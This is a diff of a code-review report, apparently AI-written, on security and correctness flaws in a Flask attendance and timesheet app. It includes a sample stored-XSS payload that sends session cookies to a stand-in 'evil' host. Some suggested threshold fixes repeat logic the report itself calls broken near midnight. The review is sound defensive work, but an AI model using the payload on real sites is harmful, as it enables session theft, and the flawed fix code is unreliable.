@@ -4,50 +4,43 @@ reviewed: 2026-06-13T00:00:00Z
 depth: standard
 files_reviewed: 8
 files_reviewed_list:
+  - tests/test_timesheet.py
+  - tests/conftest.py
   - app.py
-  - templates/admin.html
+  - templates/timesheet.html
   - templates/org_admin.html
+  - templates/admin.html
   - templates/register.html
   - templates/superadmin.html
-  - templates/timesheet.html
-  - tests/conftest.py
-  - tests/test_timesheet.py
 findings:
-  critical: 6
-  warning: 7
+  critical: 5
+  warning: 6
   info: 3
-  total: 16
+  total: 14
 status: issues_found
 ---
 
 # Phase 03: Code Review Report
 
-**Reviewed:** 2026-06-13T00:00:00Z
+**Reviewed:** 2026-06-13
 **Depth:** standard
 **Files Reviewed:** 8
 **Status:** issues_found
 
 ## Summary
 
-This phase implements the T-13 timesheet grid, symbol engine, per-employee schedule support, and
-department-scoped inline overrides. The core symbol-computation logic is well-structured and the
-RBAC scope guards on the override endpoint are correctly placed server-side. However, six
-blockers were found: two authorization gaps allow any `dept_admin` or `org_admin` to delete or
-reset face data for employees they do not manage; two attendance API endpoints (`/api/attendance`
-and `/api/stats`) return data for all employees regardless of the caller's org/dept scope; one
-date-validation bypass allows arbitrary strings to be stored as override keys; and new
-organizations are created with hard-coded default PINs (0000 / 1234). Additionally there are
-several warnings around data integrity, XSS in admin.html, locking semantics for JSON files,
-and the superadmin UI leaking bcrypt hashes into the browser.
+Phase 03 adds a T-13 timesheet engine (`compute_symbol`, `compute_employee_totals`, `compute_timesheet_grid`, `compute_dept_summary`), a `/timesheet` route with RBAC-scoped dept selection, an override API (`/api/timesheet/override`), and a DASH-04 per-dept summary for org_admin. The timesheet logic is generally correct but five blockers were identified: two RBAC scope bypass vulnerabilities (employees can be deleted cross-department/org; users can be created scoped to arbitrary organizations); one stored XSS path through employee name/role in `admin.html`; one endpoint crash on non-JSON requests (`request.json` unguarded); and one hardcoded Flask secret key in source. Several warnings cover file I/O atomicity gaps and compute_symbol correctness on edge-case schedules.
 
 ---
 
 ## Critical Issues
 
-### CR-01: Missing scope check on DELETE /api/employees/<emp_id>
+### CR-01: dept_admin and org_admin can delete any employee regardless of scope
 
-**File:** `app.py:1418-1430`
-**Issue:** `delete_employee` is decorated with `@require_role("superadmin", "org_admin", "dept_admin")` but performs **no org/dept scope check**. Any `dept_admin` or `org_admin` can DELETE any employee from any organisation by supplying an arbitrary `emp_id` in the URL. The equivalent protection that exists in `update_employee_assignment` (line 1403-1410) and `update_employee_schedule` (line 1451-1452) is completely absent here.
+**File:** `app.py:1418-1429`
+**Issue:** `DELETE /api/employees/<emp_id>` has no scope check. `@require_role("superadmin", "org_admin", "dept_admin")` gates entry, but no code verifies that the target employee belongs to the caller's department or organization. A dept_admin for dept-A can send `DELETE /api/employees/<emp_id_from_dept_B>` and it will succeed, deleting the employee record and their entire face image directory via `shutil.rmtree`.
+
+The same gap exists on `POST /api/employees/<emp_id>/reset` (line 1482-1495), which resets face photos: no scope check, any dept_admin can wipe face data for any employee.
 
 **Fix:**
 ```python
@@ -56,14 +49,12 @@ and the superadmin UI leaking bcrypt hashes into the browser.
 def delete_employee(emp_id):
     employees = load_employees()
     if emp_id not in employees:
-        return jsonify({"status": "deleted"})  # idempotent — keep existing behaviour
+        return jsonify({"status": "deleted"})
     emp = employees[emp_id]
-    caller_role = session.get("role")
-    caller_org_id = session.get("org_id")
-    caller_dept_id = session.get("dept_id")
-    if caller_role == "dept_admin" and emp.get("dept_id") != caller_dept_id:
+    role = session.get("role")
+    if role == "dept_admin" and emp.get("dept_id") != session.get("dept_id"):
         return jsonify({"error": "forbidden"}), 403
-    if caller_role == "org_admin" and emp.get("org_id") != caller_org_id:
+    if role == "org_admin" and emp.get("org_id") != session.get("org_id"):
         return jsonify({"error": "forbidden"}), 403
     del employees[emp_id]
     save_employees(employees)
@@ -73,135 +64,137 @@ def delete_employee(emp_id):
     train_recognizer()
     return jsonify({"status": "deleted"})
 ```
+Apply the same scope check pattern to `reset_employee_face`.
 
 ---
 
-### CR-02: Missing scope check on POST /api/employees/<emp_id>/reset
+### CR-02: org_admin can create users scoped to arbitrary organizations
 
-**File:** `app.py:1482-1495`
-**Issue:** `reset_employee_face` is accessible to `dept_admin` and `org_admin` but has **no org/dept scope check**. Any authenticated `dept_admin` can wipe face photos for an employee in a completely different department, triggering retraining with missing data. The endpoint only checks that the employee exists (line 1487); it never validates the caller's scope against the employee's `dept_id` / `org_id`.
+**File:** `app.py:1061`
+**Issue:** In `create_user`, `new_org_id` is assigned from the request body without validating it belongs to the caller's org:
+
+```python
+new_org_id = data.get("org_id") or (caller_org_id if creator_role != "superadmin" else None)
+```
+
+An org_admin for org-A can POST `{"username": "x", "password": "xxxxxxxx", "role": "dept_admin", "org_id": "org-B"}` and create a `dept_admin` user scoped to org-B. That new account can then call `GET /api/employees` and receive all employees of org-B.
 
 **Fix:**
 ```python
-@app.route("/api/employees/<emp_id>/reset", methods=["POST"])
-@require_role("superadmin", "org_admin", "dept_admin")
-def reset_employee_face(emp_id):
-    employees = load_employees()
-    if emp_id not in employees:
-        return jsonify({"error": "Сотрудник не найден"}), 404
-    emp = employees[emp_id]
-    caller_role = session.get("role")
-    if caller_role == "dept_admin" and emp.get("dept_id") != session.get("dept_id"):
-        return jsonify({"error": "forbidden"}), 403
-    if caller_role == "org_admin" and emp.get("org_id") != session.get("org_id"):
-        return jsonify({"error": "forbidden"}), 403
-    # ... rest of function unchanged
+if creator_role == "org_admin":
+    new_org_id = caller_org_id          # always force to session org
+elif creator_role == "superadmin":
+    new_org_id = data.get("org_id")     # superadmin may assign explicitly
+else:  # dept_admin
+    new_org_id = caller_org_id
 ```
 
 ---
 
-### CR-03: /api/attendance returns all-org data to dept_admin and org_admin
+### CR-03: Stored XSS via employee name/role in admin.html attendance journal
 
-**File:** `app.py:1733-1760`
-**Issue:** `get_attendance` iterates over **all employees** and returns every record to any authenticated caller, regardless of role. An `org_admin` from org-A can query `/api/attendance?date=2026-06-13` and receive attendance records for employees in org-B. The same gap exists for `dept_admin`. The scoping that is correctly applied in `dept_attendance_today` (line 1531-1534) is completely absent here. This endpoint is called directly by `admin.html` via `fetch("/api/attendance?date=...")`.
+**File:** `templates/admin.html:385,387,262,467,468`
+**Issue:** The attendance journal (`renderTable`, `loadStats`, `loadUsers`) inserts server-supplied strings directly into `innerHTML` template literals without HTML-escaping:
 
-**Fix:**
+- `r.name` (employee name) at line 385
+- `r.role` (employee role value) at line 387
+- `u.username` (admin username) at line 262
+- `e.name` and `e.role` in the stats table at lines 467-468
+
+Employee names and roles are stored verbatim from `data["name"]` and `data.get("role")` in `add_employee` (lines 1373-1374) with no sanitization. A dept_admin or self-registering user (via `/register/<reg_token>`) can set their name to `<img src=x onerror="fetch('https://evil/'+document.cookie)">`. When a superadmin or org_admin opens `/admin`, the script executes in their browser with full session cookie access.
+
+Flask's Jinja2 autoescape only protects server-rendered `{{ }}` expressions; it does not protect JavaScript `innerHTML` assignments.
+
+**Fix:** Apply the existing `escapeHtml` helper (defined in the same page at line ~477) consistently:
+```javascript
+// Line 385:
+<span style="font-weight:500;">${escapeHtml(r.name)}</span>
+// Line 387:
+<td style="color:#546e7a;">${escapeHtml(r.role)}</td>
+// Line 262:
+<td style="font-weight:500;">${escapeHtml(u.username)}</td>
+// Lines 467-468:
+<td><span style="font-weight:500;">${escapeHtml(e.name)}</span></td>
+<td style="color:#546e7a;">${escapeHtml(e.role)}</td>
+```
+Also apply to `register.html` lines 336-337 (`e.name`, `e.role` in the emp-list card).
+
+---
+
+### CR-04: `request.json` unguarded on multiple authenticated endpoints — AttributeError on non-JSON POST
+
+**File:** `app.py:1038, 1090, 1591, 1592, 1597, 1644, 1645`
+**Issue:** Several endpoints access `request.json` directly without the `or {}` defensive pattern used elsewhere. If the client sends a POST without `Content-Type: application/json`, Flask sets `request.json` to `None` and the next attribute access raises `AttributeError` (or `TypeError` for subscript), returning a 500.
+
 ```python
-def get_attendance():
-    # ...existing date parsing...
-    role = session.get("role")
-    org_id = session.get("org_id")
-    dept_id = session.get("dept_id")
-    result = []
-    for emp_id, emp in employees.items():
-        if role == "org_admin" and emp.get("org_id") != org_id:
-            continue
-        if role == "dept_admin" and emp.get("dept_id") != dept_id:
-            continue
-        # ... rest of record building unchanged
+# Line 1038 create_user:
+data = request.json              # None if Content-Type wrong
+username = data.get(...)         # AttributeError: 'NoneType' has no attribute 'get'
+
+# Lines 1591-1592 register_face:
+data = request.json
+emp_id = data["emp_id"]          # TypeError if data is None
+
+# Line 1644 recognize:
+data = request.json
+img = decode_image(data["image"]) # TypeError if data is None
+```
+
+The unauthenticated `/api/recognize` endpoint (line 1632) is particularly exposed: any HTTP client sending a malformed request body (no Content-Type header) produces a 500 response. In debug mode this leaks a stack trace.
+
+**Fix:** Replace bare `request.json` with `request.get_json(silent=True) or {}` and add explicit field presence checks:
+```python
+# create_user / update_user:
+data = request.get_json(silent=True) or {}
+
+# register_face:
+data = request.get_json(silent=True) or {}
+if not data.get("emp_id") or not data.get("image"):
+    return jsonify({"error": "emp_id and image required"}), 400
+
+# recognize:
+data = request.get_json(silent=True) or {}
+if "image" not in data:
+    return jsonify({"error": "image required"}), 400
 ```
 
 ---
 
-### CR-04: /api/stats returns all-org statistics to dept_admin and org_admin
+### CR-05: Hardcoded fallback Flask secret key is checked into the repository
 
-**File:** `app.py:1770-1817`
-**Issue:** `get_stats` builds `emp_stats` from all employees and returns the full cross-org dataset to any authenticated caller. An `org_admin` calling `/api/stats?from=2026-01-01&to=2026-06-01` receives hours worked and late-day counts for employees from every other organisation. The late-detection logic within this function also uses a hard-coded `"09:00:00"` threshold (line 1798) instead of each employee's per-schedule start time, producing incorrect late-day counts for employees with non-default schedules — but the primary bug here is the scope leak.
-
-**Fix:** Filter `emp_stats` initialization to the caller's scope before the date loop:
+**File:** `app.py:12`
+**Issue:**
 ```python
-def get_stats():
-    role = session.get("role")
-    org_id = session.get("org_id")
-    dept_id = session.get("dept_id")
-    # ...
-    emp_stats = {
-        eid: {"name": e["name"], "role": e["role"], "days": 0, "minutes": 0, "late_days": 0}
-        for eid, e in employees.items()
-        if role == "superadmin"
-        or (role == "org_admin" and e.get("org_id") == org_id)
-        or (role == "dept_admin" and e.get("dept_id") == dept_id)
-    }
+app.secret_key = os.environ.get("SECRET_KEY", "medkontrol-secret-2026-xK9mP3qR7v")
 ```
-
----
-
-### CR-05: Insufficient date validation in timesheet override — arbitrary string stored as key
-
-**File:** `app.py:1005-1008`
-**Issue:** The date validation check (line 1005) only verifies that `date_str` is exactly 10 characters with hyphens at positions 4 and 7. It does not validate that the individual numeric components represent a real calendar date. A client can POST `"date": "9999-99-99"` or `"date": "2025-00-00"` and the string will be stored verbatim as a key in the overrides JSON. When `compute_symbol` later calls `day_date.isoformat()` and looks up that key, phantom overrides accumulate in the data store without ever matching a real date. Use `datetime.date.fromisoformat()` instead:
+The fallback `"medkontrol-secret-2026-xK9mP3qR7v"` is public in the repository. If `SECRET_KEY` is absent from the environment — likely on a fresh deployment or after a PM2 config reset — Flask silently uses this known string. An attacker can use it to craft valid session cookies, forging `user_id`, `role`, `org_id`, and `dept_id` values and bypassing all RBAC checks.
 
 **Fix:**
 ```python
-# Replace the current format-only check with a parse check
-try:
-    datetime.strptime(date_str, "%Y-%m-%d")
-except (ValueError, TypeError):
-    return jsonify({"error": "invalid_date"}), 422
-```
-
----
-
-### CR-06: New organisations are created with hard-coded default PINs (0000 / 1234)
-
-**File:** `app.py:1130-1131`
-**Issue:** Every organisation created via `POST /api/orgs` receives `kiosk_pin = hash_pin("0000")` and `reg_pin = hash_pin("1234")` at creation time (lines 1130-1131). Because `has_pin` is set to `True` (the hash is not `None`) on the kiosk page, the kiosk will ask for a PIN — and the correct answer is always "0000" unless an admin explicitly changes it. In a clinic environment where multiple orgs are created and staff do not immediately update PINs, this provides a trivial bypass for any employee registration link or kiosk session. The PIN should default to `None` (no PIN required) so there is no false sense of security.
-
-**Fix:**
-```python
-orgs[org_id] = {
-    # ...
-    "kiosk_pin": None,   # require explicit configuration before enabling
-    "reg_pin": None,
-    # ...
-}
+secret_key = os.environ.get("SECRET_KEY")
+if not secret_key:
+    raise RuntimeError(
+        "SECRET_KEY environment variable must be set to a long random string. "
+        "Generate one with: python -c \"import secrets; print(secrets.token_hex(32))\""
+    )
+app.secret_key = secret_key
 ```
 
 ---
 
 ## Warnings
 
-### WR-01: XSS — employee name and role rendered without escaping in admin.html
-
-**File:** `templates/admin.html:385, 387, 467, 468`
-**Issue:** The attendance journal table and the monthly stats table interpolate `r.name`, `r.role`, `e.name`, and `e.role` directly into `innerHTML` template literals without any escaping. `admin.html` does not define an `escapeHtml` helper (unlike `org_admin.html` and `superadmin.html` which do). If an employee name or role contains `<script>alert(1)</script>`, it executes in the browser of any `dept_admin` or `org_admin` who views the report. The attendance data comes from `GET /api/attendance` which returns the raw `emp["name"]` and `emp["role"]` strings set at registration time.
-
-**Fix:** Add an `escapeHtml` function to `admin.html` (identical to the one in `org_admin.html`) and wrap all user-supplied string interpolations: `${escapeHtml(r.name)}`, `${escapeHtml(r.role)}`, `${escapeHtml(e.name)}`, `${escapeHtml(e.role)}`.
-
----
-
-### WR-02: save_orgs and save_depts truncate the file before acquiring the lock
+### WR-01: `save_orgs` and `save_depts` truncate the file before acquiring the lock
 
 **File:** `app.py:149-165`
-**Issue:** `save_orgs` and `save_depts` open their target files with `"w"` mode (which truncates the file to zero bytes immediately), then call `fcntl.flock(..., LOCK_EX)`. The file is empty between `open()` and the moment the lock is granted. A concurrent reader calling `load_orgs()` / `load_depts()` — which has no locking — can see a zero-byte file and return `{}`, causing silent data loss. Compare with `save_users` and `save_timesheet_overrides` which correctly write to a temp file and use `os.replace()` for atomic promotion.
+**Issue:** Both functions open with `"w"` mode (which truncates the file to zero) and only then call `fcntl.LOCK_EX`. Two gunicorn workers calling `save_orgs` concurrently will both truncate the file before either acquires the lock, creating a window where `orgs.json` is empty. The `save_users` and `save_timesheet_overrides` functions correctly use `tempfile.mkstemp + os.replace` to avoid this.
 
-**Fix:** Rewrite both functions to match the safe atomic pattern:
+**Fix:** Use the same tempfile+atomic rename pattern:
 ```python
 def save_orgs(data):
     tmp_fd, tmp_path = tempfile.mkstemp(dir=DATA_DIR, prefix="orgs_", suffix=".tmp")
     try:
         with os.fdopen(tmp_fd, "w", encoding="utf-8") as fh:
-            fcntl.flock(fh, fcntl.LOCK_EX)
             json.dump(data, fh, ensure_ascii=False, indent=2)
         os.replace(tmp_path, ORGS_FILE)
     except Exception:
@@ -211,68 +204,42 @@ def save_orgs(data):
             pass
         raise
 ```
-Apply the same pattern to `save_depts`.
+Apply the same fix to `save_depts`, `save_employees`, `save_attendance`, and `append_log`.
 
 ---
 
-### WR-03: superadmin.html populates the PIN input with the raw bcrypt hash
+### WR-02: `compute_symbol` generates invalid threshold strings for schedules near midnight
 
-**File:** `templates/superadmin.html:312`
-**Issue:** In `startEdit(orgId)`, the edit form's PIN field is populated with `org.kiosk_pin || ''`. The value of `org.kiosk_pin` returned by `/api/orgs` is the full bcrypt hash string (e.g. `$2b$12$...`), not the plaintext PIN. This 60-character hash string is written into the `<input>` field. When a superadmin then saves the form without changing the PIN, `saveOrg` sends `kiosk_pin: "$2b$12$..."` to `PATCH /api/orgs/<id>/settings`. The server then calls `hash_pin("$2b$12$...")` — bcrypt-hashing a bcrypt hash — and the original PIN becomes permanently unverifiable.
-
-**Fix:** Either (a) omit the PIN from `GET /api/orgs` response entirely (preferred), or (b) populate the edit field with a placeholder instead of the hash:
-```javascript
-// In startEdit():
-document.getElementById('orgKioskPin').value = '';  // never populate with hash
-document.getElementById('orgKioskPin').placeholder = org.kiosk_pin ? '(PIN установлен)' : 'Оставьте пустым — без PIN';
-```
-And in `saveOrg`, only include `kiosk_pin` in the PATCH body when the field is non-empty.
-
----
-
-### WR-04: /api/users GET exposes all users to dept_admin with no scope filter
-
-**File:** `app.py:1015-1033`
-**Issue:** `list_users` applies a scope filter only for `org_admin` (lines 1022-1024). When `caller_role == "dept_admin"`, there is no filtering — the function falls through to `result.append(...)` for every user in the system. A `dept_admin` receives a list of all users including their `username`, `role`, `active` status, `org_id`, and `dept_id`. The `dept_admin` role should only see users within its own `dept_id` (or none at all).
-
-**Fix:**
+**File:** `app.py:270-286`
+**Issue:** When `schedule.start = "23:50"`, the late threshold computation produces:
 ```python
-for u in users.values():
-    if caller_role == "org_admin" and u.get("org_id") != caller_org_id:
-        continue
-    if caller_role == "dept_admin":
-        # dept_admin should only see users in their own dept
-        caller_dept_id = session.get("dept_id")
-        if u.get("dept_id") != caller_dept_id:
-            continue
-    result.append({ ... })
+late_m = 50 + 15  # = 65
+late_threshold = f"{23 + 1:02d}:{65 % 60:02d}:00"  # = "24:05:00"
 ```
+The string `"24:05:00"` is lexicographically greater than any valid `HH:MM:SS`, so `check_in > "24:05:00"` is always False — nobody is ever late. Similarly, `schedule.end = "00:10"` produces `early_threshold = "-1:55:00"` which is less than any valid time — everyone is always early. The results are wrong and silent.
 
----
-
-### WR-05: add_employee does not validate that org_id supplied by org_admin belongs to them
-
-**File:** `app.py:1367-1369`
-**Issue:** When `caller_role == "org_admin"`, the code sets `org_id = data.get("org_id") if caller_role != "dept_admin" else ...` (line 1368). This means an `org_admin` can pass any `org_id` in the request body and the employee will be created under that foreign org, because the only guard is `if caller_role == "dept_admin"`. The `org_admin` must be restricted to `caller_org_id` from the session.
-
-**Fix:**
+**Fix:** Use `datetime` arithmetic instead of string manipulation:
 ```python
-if caller_role == "org_admin":
-    org_id = caller_org_id  # always session value; ignore request body
-elif caller_role == "dept_admin":
-    org_id = data.get("org_id") or caller_org_id
-else:
-    org_id = data.get("org_id")
+from datetime import datetime, timedelta
+
+def _time_threshold(base_hhmm: str, delta_minutes: int) -> str:
+    base = datetime.strptime(base_hhmm, "%H:%M")
+    result = (base + timedelta(minutes=delta_minutes))
+    # Clamp to same day to avoid midnight wraparound nonsense
+    return result.strftime("%H:%M:%S")
+
+late_threshold = _time_threshold(schedule.get("start", "09:00"), 15)
+early_threshold = _time_threshold(schedule.get("end", "18:00"), -15)
 ```
 
 ---
 
-### WR-06: /timesheet — year value is not range-checked, allowing pathological calendar dates
+### WR-03: Missing year range validation in `/timesheet` route
 
-**File:** `app.py:855-861`
-**Issue:** The `timesheet` route validates `1 <= month_num <= 12` but does not constrain `year`. A caller can supply `?month=9999-12` and `calendar.monthrange(9999, 12)` will succeed, but `date(9999, 12, 1)` operations across 31 days will work fine in Python. The more dangerous case is a very large year value causing `compute_symbol` to compare `day_date > date.today()` — every day will be `None` (future), producing an empty timesheet rather than an error. The `org_admin` summary route at line 761 does correctly validate `2000 <= sum_year <= 2100`; the same guard should be applied here.
+**File:** `app.py:856-861`
+**Issue:** The `?month=` parameter validates `1 <= month_num <= 12` but not the year. The DASH-04 summary path (line 761) correctly requires `2000 <= sum_year <= 2100`. A request to `/timesheet?month=0001-01` generates a valid 200 response (year 1 has no holiday data, so the missing-holiday banner fires) and iterates `date(1, 1, d)` objects. While Python's `calendar` and `date` handle year 1 correctly, this inconsistency means the holiday-missing warning fires for every pre-2024 date, confusing users.
 
-**Fix:**
+**Fix:** Add the same range check as the summary path:
 ```python
 if not (1 <= month_num <= 12 and 2000 <= year <= 2100):
     raise ValueError("out of range")
@@ -280,44 +247,100 @@ if not (1 <= month_num <= 12 and 2000 <= year <= 2100):
 
 ---
 
-### WR-07: update_user (PATCH) does not check org-scope for org_admin callers
+### WR-04: `add_employee` crashes with `KeyError` when `name` field is absent
 
-**File:** `app.py:1077-1094`
-**Issue:** `update_user` verifies only that the caller's role is higher in the hierarchy than the target's role. An `org_admin` from org-A can activate or deactivate a user in org-B by supplying their `user_id`. The org_admin scope restriction present in `list_users` is not enforced here.
+**File:** `app.py:1373`
+**Issue:** Line 1373 uses `data["name"]` without a `.get()` guard. Every other field in the same function uses `data.get(...)`. A POST request to `POST /api/employees` with a JSON body missing the `name` key raises `KeyError` and returns 500.
 
-**Fix:** Add an org-scope check after the role-hierarchy check:
+**Fix:**
 ```python
-if caller_role == "org_admin" and target.get("org_id") != session.get("org_id"):
-    return jsonify({"error": "forbidden"}), 403
+name = data.get("name", "").strip()
+if not name:
+    return jsonify({"error": "ФИО обязательно"}), 400
+# ...
+employees[emp_id] = {
+    "id": emp_id,
+    "name": name,
+    # ...
+}
+```
+
+---
+
+### WR-05: Override API date validation does not reject out-of-range month/day values
+
+**File:** `app.py:1004-1008`
+**Issue:** The date check passes `"2025-13-01"`, `"2025-00-00"`, and `"aaaa-bb-cc"` (anything 10 chars with dashes at positions 4 and 7). These are stored in `timesheet_overrides.json` as keys that `compute_symbol` will never match (since it uses `date.isoformat()`), permanently inflating the overrides file with unreachable entries. Over time this causes silent data rot.
+
+**Fix:**
+```python
+try:
+    datetime.strptime(date_str, "%Y-%m-%d").date()
+except (ValueError, TypeError):
+    return jsonify({"error": "invalid_date"}), 422
+```
+
+---
+
+### WR-06: `viewer` role can be created but never logged in — dead accounts with no diagnostic
+
+**File:** `app.py:99, 1047`; `templates/org_admin.html:280`
+**Issue:** `ALLOWED_LOGIN_ROLES = ("superadmin", "org_admin", "dept_admin")` excludes `viewer`. The `create_user` endpoint accepts `viewer` (it is in `ROLE_HIERARCHY`), and the org_admin UI offers "Наблюдатель" in the role dropdown. Admins will create viewer accounts that are permanently non-functional with no error message at creation time or login time.
+
+**Fix:** Either add `"viewer"` to `ALLOWED_LOGIN_ROLES` (if viewer is an intended read-only role), or remove `viewer` from the create-user dropdowns and add a validation guard in `create_user`:
+```python
+if target_role == "viewer":
+    return jsonify({"error": "Роль 'viewer' не поддерживается в текущей версии"}), 400
 ```
 
 ---
 
 ## Info
 
-### IN-01: Hard-coded late threshold "09:00:00" in /api/stats ignores per-employee schedules
+### IN-01: `compute_dept_summary` uses raw `dept_id` UUID as fallback dept name
 
-**File:** `app.py:1798`
-**Issue:** The stats endpoint uses the magic string `"09:00:00"` to determine whether a check-in is late, ignoring each employee's per-schedule `start` time. This is inconsistent with the `compute_symbol` logic and the `dept_attendance_today` endpoint which both compute a per-employee late threshold. Employees with a `10:00` start schedule will be counted as late when they check in at `09:30`.
+**File:** `app.py:374`
+**Issue:** `dept_name = dept_id` is used as a fallback when a dept's name cannot be resolved. If `depts.json` has a corrupt or deleted record, the DASH-04 table displays the raw UUID. The enrichment at lines 773-775 in `org_admin_page` corrects this for the normal path, so this only surfaces on data corruption.
 
-**Fix:** Compute the late threshold per employee using the same helper pattern as `dept_attendance_today` lines 1554-1559.
-
----
-
-### IN-02: conftest.py does not patch TIMESHEET_OVERRIDES_FILE before app module-level code runs
-
-**File:** `tests/conftest.py:64-66`
-**Issue:** `TIMESHEET_OVERRIDES_FILE` is monkeypatched inside `tmp_data` fixture, but module-level code in `app.py` runs at import time (including `init_config()` and `init_users()`). While those two functions only read/write `CONFIG_FILE` and `USERS_FILE`, the guard `if hasattr(_app, "TIMESHEET_OVERRIDES_FILE")` means patching only occurs if the attribute exists — which it does now that Phase 3 has landed. This is fine as implemented; the comment on line 64 is now stale and should be updated: `# TIMESHEET_OVERRIDES_FILE added in 03-02`.
+**Fix:** Use a localized placeholder instead of the raw UUID:
+```python
+dept_name = "(отдел удалён)"  # instead of dept_id
+```
 
 ---
 
-### IN-03: Commented-out / dead code in admin.html — `creatable_roles` variable used in superadmin-only block
+### IN-02: `save_users` acquires flock on a unique tempfile — the lock does nothing
 
-**File:** `templates/admin.html:146-149`
-**Issue:** The "Пользователи" tab in `admin.html` is conditionally rendered only for `superadmin` (lines 83-85 and 127-173), and the `creatable_roles` Jinja variable is only populated when the caller is a `superadmin` (via the `admin_page` route which redirects superadmin to `superadmin_page`). In practice this block is unreachable for the roles that `admin.html` actually serves (dept_admin, org_admin after redirect), making the whole users tab in `admin.html` dead code. Consider removing this tab from `admin.html` entirely and consolidating user management in `superadmin.html` and `org_admin.html`.
+**File:** `app.py:64`
+**Issue:** `tempfile.mkstemp` creates a file that no other process shares. `fcntl.flock(fh, LOCK_EX)` on line 64 acquires an exclusive lock on a file that already belongs exclusively to this process's fd — no other process can hold it. The lock is a no-op. The crash-safety derives entirely from `os.replace()` on line 66. The flock call is misleading and suggests concurrent-write protection that does not exist.
+
+**Fix:** Either remove the flock (the `os.replace` is sufficient for crash-safety), or implement real concurrent-write protection via a separate named lock file (e.g., `DATA_DIR/.users.lock`).
 
 ---
 
-_Reviewed: 2026-06-13T00:00:00Z_
+### IN-03: `is_late` check in `/api/recognize` uses hardcoded `"09:00:00"` threshold
+
+**File:** `app.py:1682`
+**Issue:**
+```python
+is_late = now > "09:00:00"
+```
+This ignores per-employee schedules entirely. An employee with a `schedule.start = "10:00"` who checks in at `09:30` will be flagged as late in the kiosk response, even though they are 30 minutes early. The `compute_symbol` engine (line 233) correctly uses `schedule.get("start")` for its threshold. The `is_late` field in the kiosk API response is therefore inconsistent with the timesheet grid.
+
+**Fix:** Retrieve the employee's schedule and compute the threshold the same way `compute_symbol` does:
+```python
+schedule = emp.get("schedule", {"start": "09:00", "end": "18:00", "work_days": [1, 2, 3, 4, 5]})
+sh, sm = map(int, schedule.get("start", "09:00").split(":"))
+late_m = sm + 15
+if late_m >= 60:
+    late_threshold = f"{sh + 1:02d}:{late_m % 60:02d}:00"
+else:
+    late_threshold = f"{sh:02d}:{late_m:02d}:00"
+is_late = now > late_threshold
+```
+
+---
+
+_Reviewed: 2026-06-13_
 _Reviewer: Claude (gsd-code-reviewer)_
 _Depth: standard_
